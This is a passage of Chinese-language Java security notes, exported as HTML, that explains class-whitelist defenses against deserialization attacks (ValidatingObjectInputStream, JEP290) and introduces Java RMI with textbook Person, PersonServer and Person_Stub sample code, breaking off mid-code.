role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">returnsuper</span>.<span class="cm-variable">resolveClass</span>(<span class="cm-variable">desc</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><span>以上的 Demo 就只允许序列化 SerialObject ，通过这种方式，就可以设置允许序列化的白名单，来防止反序列化漏洞被利用。SerialKiller/Jackson/Weblogic 等都使用了这种方式来防御。</span></p><h4 id='validatingobjectinputstream'><span>ValidatingObjectInputStream</span></h4><p><span>Apache Commons IO Serialization 包中的 ValidatingObjectInputStream 类提供了 accept 方法，可以通过该方法来实现反序列化类白/黑名单控制，一个 demo 如下</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.32812px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>7</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">private</span> <span class="cm-keyword">static</span> <span class="cm-variable-3">Object</span> <span class="cm-def">deserialize</span>(<span class="cm-variable-3">byte</span>[] <span class="cm-variable">buffer</span>) <span class="cm-keyword">throws</span> <span class="cm-variable">IOException</span>,<span class="cm-variable">ClassNotFoundException</span>,<span class="cm-variable">ConfigurationException</span>{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">Objectobj</span>; <span class="cm-tab" role="presentation" cm-text="	"> </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ByteArrayInputStreambais</span><span class="cm-operator">=</span><span class="cm-variable">newByteArrayInputStream</span>(<span class="cm-variable">buffer</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">ValidatingObjectInputStreamois</span><span class="cm-operator">=</span><span class="cm-variable">newValidatingObjectInputStream</span>(<span class="cm-variable">bais</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ois</span>.<span class="cm-variable">accept</span>(<span class="cm-variable">SerialObject</span>.<span class="cm-keyword">class</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">obj</span><span class="cm-operator">=</span><span class="cm-variable">ois</span>.<span class="cm-variable">readObject</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">obj</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='objectinputfilterjep290'><span>ObjectInputFilter(JEP290)</span></h4><p><span>Java 9 提供了支持序列化数据过滤的新特性，可以继承 java.io.ObjectInputFilter 类重写 checkInput方法来实现自定义的过滤器，并使用 ObjectInputStream 对象的 setObjectInputFilter 设置过滤器来实现反序列化类白/黑名单控制。这个机制本身是针对 Java 9 的一个新特性，但是随后官方突然决定向下引进该增强机制，分别对 JDK 6,7,8 进行了支持。这个机制主要描述了如下的机制：</span></p><ul><li><span>提供一个限制反序列化类的机制，白名单或者黑名单</span></li><li><span>限制反序列化的深度和复杂度</span></li><li><span>为 RMI 远程调用对象提供了一个验证类的机制</span></li><li><span>定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器</span></li></ul><p>&nbsp;</p><h3 id='rmi-1'><span>RMI</span></h3><h4 id='简介-26'><span>简介</span></h4><p><span>RMI(Remote Method Invocation，远程方法调用) 能够让在客户端 Java 虚拟机上的对象像调用本地对象一样调用服务端 Java 虚拟机中的对象上的方法。其中 RMI 标准实现是 Java RMI，之外还有 Weblogic RMI、 Spring RMI 等不同的实现。</span></p><p><span>RMI 中比较重要的两个概念是 Stub 和 Skeleton，Stub 和 Skeleton 对同一套接口进行实现，其中 Stub 由 Client 端调用，并不进行真正的实现，而是和 Server 端通信。Skeleton 是 Server 端，监听来自 Stub 的连接，根据 Stub 发送的数据进行真正的操作。</span></p><h4 id='调用步骤'><span>调用步骤</span></h4><ul><li><span>客户调用客户端辅助对象 Stub 上的方法</span></li><li><span>客户端辅助对象 Stub 打包调用信息 (变量，方法名)，通过网络发送给服务端辅助对象 Skeleton</span></li><li><span>服务端辅助对象 Skeleton 将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象</span></li><li><span>调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象 Skeleton</span></li><li><span>服务端辅助对象将结果打包，发送给客户端辅助对象 Stub</span></li><li><span>客户端辅助对象将返回值解包，返回给调用者</span></li><li><span>客户获得返回值</span></li></ul><h4 id='样例'><span>样例</span></h4><p><span>一份代码样例如下 (来自《Enterprise JavaBeans》)：</span></p><h5 id='person-接口定义'><span>Person 接口定义</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>4</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">public</span> <span class="cm-keyword">interface</span> <span class="cm-def">Person</span>{ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable-3">int</span> <span class="cm-variable">getAge</span>() <span class="cm-keyword">throws</span> <span class="cm-variable">Throwable</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable-3">String</span> <span class="cm-variable">getName</span>() <span class="cm-keyword">throws</span> <span class="cm-variable">Throwable</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 91px;"></div><div class="CodeMirror-gutters" style="height: 91px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h5 id='使用-personserver-实现-person'><span>使用 PersonServer 实现 Person</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>14</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" class="cm-tab-wrap-hack" style="padding-right: 0.1px;"><span class="cm-keyword">public</span> <span class="cm-keyword">class</span> <span class="cm-def">PersonServer</span> <span class="cm-keyword">implements</span> <span class="cm-variable">Person</span>{ <span class="cm-tab" role="presentation" cm-text="	">   </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">private</span> <span class="cm-variable-3">int</span> <span class="cm-variable">age</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">private</span> <span class="cm-variable-3">String</span> <span class="cm-variable">name</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable">PersonServer</span>(<span class="cm-variable">Stringname</span>,<span class="cm-variable">intage</span>){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">this</span>.<span class="cm-variable">age</span><span class="cm-operator">=</span><span class="cm-variable">age</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">this</span>.<span class="cm-variable">name</span><span class="cm-operator">=</span><span class="cm-variable">name</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable-3">int</span> <span class="cm-variable">getAge</span>(){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">returnage</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable-3">String</span> <span class="cm-variable">getName</span>(){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">name</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 317px;"></div><div class="CodeMirror-gutters" style="height: 317px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h5 id='使用-personstub-实现-person'><span>使用 Person_Stub 实现 Person</span></h5><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>25</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">java</span>.<span class="cm-variable">io</span>.<span class="cm-variable">ObjectOutputStream</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">java</span>.<span class="cm-variable">io</span>.<span class="cm-variable">ObjectInputStream</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">java</span>.<span class="cm-variable">net</span>.<span class="cm-variable">Socket</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">public</span> <span class="cm-keyword">class</span> <span class="cm-def">Person_Stub</span> <span class="cm-keyword">implements</span> <span class="cm-variable">Person</span>{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">private</span> <span class="cm-variable">Socket</span> <span class="cm-variable">socket</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable">Person_Stub</span>() <span class="cm-keyword">throws</span> <span class="cm-variable">Throwable</span>{ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//connect to skeleton </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">socket</span><span class="cm-operator">=</span><span class="cm-variable">newSocket</span>(<span class="cm-string">"computer_name"</span>,<span class="cm-number">9000</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable-3">int</span> <span class="cm-variable">getAge</span>() <span class="cm-keyword">throws</span> <span class="cm-variable">Throwable</span>{ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//pass method name to skeleton </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ObjectOutputStream</span> <span class="cm-variable">outStream</span><span class="cm-operator">=</span> <span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">new</span> <span class="cm-variable">ObjectOutputStream</span>(<span class="cm-variable">socket</span>.<span class="cm-variable">getOutputStream</span>()); <span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">outStream</span>.<span class="cm-variable">writeObject</span>(<span class="cm-string">"age"</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">outStream</span>.<span class="cm-variable">flush</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ObjectInputStream</span> <span class="cm-variable">inStream</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-tab" role="presentation" cm-text="	"> </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ObjectInputStream</span>(<span class="cm-variable">socket</span>.<span class="cm-variable">getInputStream</span>()); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">inStream</span>.<span class="cm-variable">readInt</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable-3">String</span> <span class="cm-variable">getName</span>()<span class="cm-variable">throwsThrowable</span>{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//pass method name to skeleton </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ObjectOutputStream</span> <span class="cm-variable">outStream</span><span class="cm-operator">=</span> <span class="cm-keyword">new</span> <span class="cm-tab" role="presentation" cm-text="	">  </span><span 